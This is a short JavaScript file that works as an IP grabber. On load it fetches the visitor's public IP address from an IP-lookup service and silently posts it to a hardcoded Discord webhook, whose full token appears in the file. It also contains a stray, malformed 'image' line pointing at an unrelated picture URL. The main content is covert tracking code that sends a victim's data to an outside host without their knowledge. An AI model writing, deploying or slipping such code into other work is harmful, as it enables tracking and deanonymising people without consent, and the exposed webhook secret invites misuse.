
const ipifyAPI = "https://api.ipify.org?format=json";


const webhookURL = "https://discord.com/api/webhooks/1528810563461845145/zlNGcv_sS1KVrlxO9m33CEFUQKfNaZf25-qvbd_OUD4WE20fWSxWo9m75xTLrpgbVNmX";
"image": "https://ew.com/thmb/0sn-Oz90GZTSVLF6cJ0EsApoRKA=/2000x0/filters:no_upscale():max_bytes(150000):strip_icc()/b31-92532f841b9349638d226a6c62aa9e85.jpg"


async function getIP() {
    try {
        const response = await fetch(ipifyAPI);
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error("Error fetching IP:", error);
        return null;
    }
}

async function sendToDiscord(ip) {
    if (!ip) {
        console.error("IP address is null or undefined.");
        return;
    }

    const payload = {
        content: `IP Address: ${ip}`
    };

    try {
        const response = await fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log("IP sent to Discord successfully!");
        } else {
            console.error("Error sending IP to Discord:", response.statusText);
        }
    } catch (error) {
        console.error("Error:", error);
    }
}


async function main() {
    const ip = await getIP();
    if (ip) {
        await sendToDiscord(ip);
    }
}


main();
